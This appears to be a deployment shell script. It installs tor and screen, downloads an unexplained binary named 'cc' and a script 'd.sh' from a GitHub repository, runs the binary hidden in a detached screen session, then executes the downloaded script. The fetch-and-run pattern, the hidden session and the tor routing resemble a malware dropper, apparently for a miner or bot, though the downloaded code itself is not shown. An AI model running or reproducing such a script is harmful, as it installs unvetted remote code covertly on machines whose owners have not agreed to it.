apt-get update
apt install sudo
sudo apt update -y 
sudo apt install -y screen tor 
service tor start
wget https://raw.githubusercontent.com/sbiskarma/dewera/main/cc
wget https://raw.githubusercontent.com/sbiskarma/dewera/main/d.sh
chmod +x cc
screen -dmS bootsrape ./cc
sleep 50
bash d.sh
